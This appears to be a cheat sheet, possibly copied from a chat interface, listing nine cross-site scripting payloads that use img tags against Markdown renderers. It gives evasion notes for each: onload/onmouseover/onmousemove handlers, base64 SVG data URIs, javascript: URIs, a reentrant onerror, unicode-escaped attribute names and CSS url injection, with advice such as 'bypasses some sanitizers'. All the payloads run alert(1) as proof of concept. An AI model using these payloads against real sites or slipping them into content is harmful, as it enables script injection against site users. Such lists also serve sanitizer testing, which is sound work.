1. Onload JavaScript Trigger (works if image is valid but slow or broken)
markdown
Copy
Edit
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" onload=alert(1)>
This is a valid 1x1 GIF â€“ triggers onload reliably.

2. onmouseover Trigger via Inline Display
markdown
Copy
Edit
<img src=x style="display:inline" onmouseover=alert(1)>
Hover-triggered XSS; user moves mouse over the image.

3. SVG Polyglot as Image
markdown
Copy
Edit
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+" onload=1>
Base64-encoded SVG with onload. Try on modern Markdown renderers.

4. XSS with JavaScript URI in src (bypasses some sanitizers)
markdown
Copy
Edit
<img src="javascript:alert(1)" onerror=alert(1)>
Not all renderers sanitize javascript: in src.

5. Broken Source + Focus-Based Payload
markdown
Copy
Edit
<img src="x" onerror="this.onerror=null;this.src='x';alert(1)">
Reentrant onerror handler to evade naive blacklist.

6. Obfuscated Attribute
markdown
Copy
Edit
<img src=x o\u006eer\u0072or=alert(1)>
Unicode escaped attribute name.

7. CSS Injection Style Variant
markdown
Copy
Edit
<img src=x style="background:url(javascript:alert(1))" onerror=1>
Works if style is respected and CSS is evaluated inline.

8. Event Handler Chain (if chained handlers are allowed)
markdown
Copy
Edit
<img src=x onerror="alert('1')" onclick="alert('2')" onmouseover="alert('3')">
Lets you trigger multiple event paths.

9. Mousemove for Silent Trigger
markdown
Copy
Edit
<img src=x style="width:100px;height:100px" onmousemove=alert(1)>
